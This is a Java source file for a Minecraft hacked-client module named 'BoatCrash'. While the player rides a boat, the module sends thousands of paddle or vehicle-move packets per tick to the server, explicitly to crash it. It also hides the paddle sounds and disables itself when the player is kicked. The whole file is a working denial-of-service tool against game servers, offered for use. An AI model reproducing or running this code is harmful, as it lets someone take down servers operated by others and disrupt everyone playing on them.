/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2022 Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.misc;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.core.BlockPos;
import net.minecraft.network.protocol.game.ServerboundMoveVehiclePacket;
import net.minecraft.network.protocol.game.ServerboundPaddleBoatPacket;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.vehicle.boat.AbstractBoat;
import net.minecraft.world.phys.Vec3;

public class BoatCrash extends Module {
    public enum Mode {
        Shit,
        New
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which crash method to use.")
        .defaultValue(Mode.New)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(2000)
        .min(1000)
        .sliderMax(8000)
        .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound")
        .description("Blocks the noisy paddle sounds.")
        .defaultValue(false)
        .visible(() -> mode.get() == Mode.Shit)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public BoatCrash() {
        super(Categories.Misc, "boat-crash", "Tries to crash the server when you are in a boat. (By 0x150)");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getConnection() == null) return;
        Entity boat = mc.player.getVehicle();
        if (!(boat instanceof AbstractBoat)) {
            error("You must be in a boat - disabling.");
            toggle();
            return;
        }
        if (mode.get() == Mode.Shit) {
            ServerboundPaddleBoatPacket PACKET = new ServerboundPaddleBoatPacket(true, true);
            for (int i = 0; i < amount.get(); i++) {
                mc.getConnection().send(PACKET);
            }
        } else {
            Entity vehicle = mc.player.getVehicle();
            BlockPos start = mc.player.getOnPos();
            Vec3 end = new Vec3(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
            vehicle.setPos(end.x, end.y - 1, end.z);
            ServerboundMoveVehiclePacket PACKET2 = ServerboundMoveVehiclePacket.fromEntity(vehicle);
            for (int i = 0; i < amount.get(); i++) {
                mc.getConnection().send(PACKET2);
            }
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && event.sound.getIdentifier().toString().equals("minecraft:entity.boat.paddle_land") || event.sound.getIdentifier().toString().equals("minecraft:entity.boat.paddle_water")) {
            event.cancel();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}

